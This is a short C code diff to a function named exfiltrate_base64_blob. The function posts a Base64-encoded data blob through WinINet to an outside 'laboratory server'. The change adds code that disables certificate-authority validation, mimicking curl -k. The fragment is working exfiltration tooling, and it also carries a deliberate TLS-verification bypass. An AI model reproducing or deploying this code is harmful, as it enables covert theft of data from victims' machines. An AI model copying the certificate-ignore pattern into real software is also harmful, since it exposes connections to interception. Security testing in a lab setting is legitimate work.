@@ -124,11 +124,26 @@ void exfiltrate_base64_blob(const char *raw_payload)
         return;
     }
 
+    // --- REPLICATE CURL -K BEHAVIOR HERE ---
+    DWORD dwFlags = 0;
+    DWORD dwBuffLen = sizeof(dwFlags);
+
+    // Read the baseline security flags from the handle
+    if (InternetQueryOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, &dwBuffLen))
+    {
+        // Force the handle to ignore unknown/untrusted CAs (Error 12045)
+        dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA;
+
+        // Apply the modified flags back to the handle
+        InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
+    }
+    // ---------------------------------------
+
     // Adjust header for an unformatted plain-text blob payload
     const char *headers = "Content-Type: text/plain\r\n";
-    DWORD headers_len = (DWORD)strlen(headers);
 
     // Transmit the Base64 data stream to the laboratory server
+    DWORD headers_len = (DWORD)strlen(headers);
     BOOL bSend = HttpSendRequestA(hRequest, headers, headers_len, (LPVOID)encoded_blob, (DWORD)strlen(encoded_blob));
     if (bSend)
     {
